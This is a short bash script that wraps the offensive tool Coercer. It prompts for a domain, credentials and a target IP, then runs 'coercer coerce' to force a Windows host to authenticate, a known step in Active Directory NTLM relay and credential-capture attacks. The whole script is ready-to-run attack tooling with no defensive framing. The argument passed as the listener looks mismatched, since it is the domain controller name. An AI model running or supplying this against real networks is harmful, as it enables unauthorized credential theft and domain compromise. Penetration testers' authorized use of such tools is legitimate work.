#!/bin/bash
BOLD="\033[1m"
RED="\033[31m"
RESET="\033[0m"
GREEN="\033[32m"

echo -e "${BOLD}${RED}wow !  coercer Request sender ---<${RESET}"

if ! command -v coercer &> /dev/null; then
    echo -e "${RED}[!] Coercer not found! Install with: pipx install coercer${RESET}"
    exit 1
fi

echo -e "${GREEN}[+] Coercer found! Starting...${RESET}"

echo "Full Domain (e.g., dc01.corp.com):"
read full_domain

echo "NetBIOS Domain (e.g., corp.com):"
read domain

echo "Username:"
read username

echo "Password:"
read  password

echo "Target IP:"
read ip


echo -e "${GREEN}[+] Running Coercer...${RESET}"
coercer coerce -u "$username" -p "$password" -d "$domain" -l "$full_domain" -t "$ip" 
